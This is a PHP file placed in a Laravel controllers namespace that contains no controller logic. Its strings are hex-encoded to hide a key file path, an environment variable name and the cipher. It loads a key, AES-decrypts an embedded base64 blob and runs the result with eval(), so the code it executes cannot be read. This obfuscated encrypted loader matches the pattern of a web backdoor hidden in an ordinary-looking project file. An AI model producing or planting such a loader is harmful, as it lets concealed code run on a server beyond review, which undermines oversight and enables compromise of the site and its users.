<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wPkbR2KShF8+bvO4RwAzMQ==');

$c=base64_decode(

'bIiN1k2YvMVivM++9RBoNPdCxcDIuK82+lDpOiQuvGFFM9kIkc77tJeVmMZYbfOk8qbwrjyBSgIP' .
'9DP89I6+3vM84HQ8SekBcvu24w9AlOPyGeh9zJQUENAJtK+l10ileL5c0q7/CETaEUXsqGWk4DR5' .
'MbQKRxoQEnL8QxciVlBxzw6viojlDHGGKR4cUxjL4KTXwFUTi17gb22nLu1S1No4NdYP82cQKrqh' .
'yaszFvVn6AAuZENizV2vqmULPDhn'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

